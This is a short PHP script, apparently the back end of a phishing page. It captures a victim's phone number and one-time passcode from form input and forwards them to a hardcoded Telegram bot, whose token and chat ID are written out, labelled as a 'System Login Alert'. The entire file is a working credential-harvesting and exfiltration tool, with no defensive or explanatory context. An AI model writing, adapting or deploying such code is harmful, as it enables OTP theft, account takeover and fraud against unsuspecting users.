<?php
date_default_timezone_set('Asia/Kolkata');
$botToken="8785026329:AAEeQU6GTDv3zTyCIvAiuB6A_Pulfxfggmc";
$chatId="5971795563";

$number=$_POST['number'] ?? '';
$otp=$_POST['otp'] ?? '';

$message  = "💡System Login Alert\n";
$message  = "💡System Login Alert\n";
$message .= "━━━━━━━━━━━━━━\n";
$message .= "📱Phone:\n`".$number."`\n";

if(!empty($otp)){
$message .= "🔓OTP:\n`".$otp."`\n";
}

$message .= "Time: ".date("d/m/Y H:i:s")."\n";
$message .= "━━━━━━━━━━━━━━";

$url="https://api.telegram.org/bot".$botToken."/sendMessage";

$data=[
"chat_id"=>$chatId,
"text"=>$message,
"parse_mode"=>"Markdown"
];

$options=[
"http"=>[
"header"=>"Content-type: application/x-www-form-urlencoded\r\n",
"method"=>"POST",
"content"=>http_build_query($data),
]
];

$context=stream_context_create($options);

file_get_contents($url,false,$context);

echo "Sent Successfully";

?>
